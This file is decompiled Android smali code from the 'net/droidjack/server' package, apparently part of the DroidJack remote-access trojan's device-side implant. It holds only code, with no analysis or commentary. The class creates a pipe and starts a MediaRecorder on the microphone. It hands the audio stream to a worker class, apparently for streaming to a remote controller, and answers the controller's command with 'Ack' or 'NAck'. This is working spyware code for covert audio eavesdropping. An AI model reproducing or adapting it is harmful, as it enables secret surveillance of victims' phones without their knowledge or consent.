.class Lnet/droidjack/server/bo;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/util/concurrent/Callable;


# instance fields
.field final synthetic a:Lnet/droidjack/server/bn;


# direct methods
.method constructor <init>(Lnet/droidjack/server/bn;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic a(Lnet/droidjack/server/bo;)Lnet/droidjack/server/bn;
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    return-object v0
.end method


# virtual methods
.method public a()[B
    .locals 5

    const/4 v4, 0x0

    iget-object v0, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    invoke-static {v0}, Lnet/droidjack/server/bn;->a(Lnet/droidjack/server/bn;)Z

    move-result v0

    if-nez v0, :cond_1

    :try_start_0
    iget-object v0, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    invoke-static {}, Landroid/os/ParcelFileDescriptor;->createPipe()[Landroid/os/ParcelFileDescriptor;

    move-result-object v1

    invoke-static {v0, v1}, Lnet/droidjack/server/bn;->a(Lnet/droidjack/server/bn;[Landroid/os/ParcelFileDescriptor;)V

    iget-object v0, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    invoke-static {v0}, Lnet/droidjack/server/bn;->b(Lnet/droidjack/server/bn;)[Landroid/os/ParcelFileDescriptor;

    move-result-object v0

    const/4 v1, 0x0

    aget-object v0, v0, v1

    iget-object v1, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    invoke-static {v1}, Lnet/droidjack/server/bn;->b(Lnet/droidjack/server/bn;)[Landroid/os/ParcelFileDescriptor;

    move-result-object v1

    const/4 v2, 0x1

    aget-object v1, v1, v2

    iget-object v2, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    new-instance v3, Landroid/media/MediaRecorder;

    invoke-direct {v3}, Landroid/media/MediaRecorder;-><init>()V

    invoke-static {v2, v3}, Lnet/droidjack/server/bn;->a(Lnet/droidjack/server/bn;Landroid/media/MediaRecorder;)V

    iget-object v2, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    invoke-static {v2}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v2

    const/4 v3, 0x2

    invoke-virtual {v2, v3}, Landroid/media/MediaRecorder;->setAudioChannels(I)V

    iget-object v2, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    invoke-static {v2}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v2

    const/16 v3, 0x2b11

    invoke-virtual {v2, v3}, Landroid/media/MediaRecorder;->setAudioSamplingRate(I)V

    iget-object v2, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    invoke-static {v2}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v2

    const/16 v3, 0x80

    invoke-virtual {v2, v3}, Landroid/media/MediaRecorder;->setAudioEncodingBitRate(I)V

    iget-object v2, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    invoke-static {v2}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v2

    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    iget-object v2, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    invoke-static {v2}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v2

    const/4 v3, 0x6

    invoke-virtual {v2, v3}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    iget-object v2, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    invoke-static {v2}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v2

    const/4 v3, 0x3

    invoke-virtual {v2, v3}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    iget-object v2, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    invoke-static {v2}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v2

    invoke-virtual {v1}, Landroid/os/ParcelFileDescriptor;->getFileDescriptor()Ljava/io/FileDescriptor;

    move-result-object v1

    invoke-virtual {v2, v1}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/io/FileDescriptor;)V

    iget-object v1, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    invoke-static {v1}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v1

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->prepare()V

    iget-object v1, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    invoke-static {v1}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v1

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->start()V

    iget-object v1, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    const/4 v2, 0x1

    invoke-static {v1, v2}, Lnet/droidjack/server/bn;->a(Lnet/droidjack/server/bn;Z)V

    new-instance v1, Ljava/io/FileInputStream;

    invoke-virtual {v0}, Landroid/os/ParcelFileDescriptor;->getFileDescriptor()Ljava/io/FileDescriptor;

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/io/FileInputStream;-><init>(Ljava/io/FileDescriptor;)V

    :goto_0
    iget-object v0, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    invoke-static {v0}, Lnet/droidjack/server/bn;->a(Lnet/droidjack/server/bn;)Z

    move-result v0

    if-eqz v0, :cond_0

    new-instance v0, Lnet/droidjack/server/bp;

    invoke-direct {v0, p0, v1}, Lnet/droidjack/server/bp;-><init>(Lnet/droidjack/server/bo;Ljava/io/FileInputStream;)V

    invoke-virtual {v0}, Lnet/droidjack/server/bp;->start()V

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    :goto_1
    return-object v0

    :cond_0
    const-wide/16 v2, 0x11

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    iget-object v1, p0, Lnet/droidjack/server/bo;->a:Lnet/droidjack/server/bn;

    invoke-static {v1, v4}, Lnet/droidjack/server/bn;->a(Lnet/droidjack/server/bn;Z)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_1

    :cond_1
    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_1
.end method

.method public synthetic call()Ljava/lang/Object;
    .locals 1

    invoke-virtual {p0}, Lnet/droidjack/server/bo;->a()[B

    move-result-object v0

    return-object v0
.end method
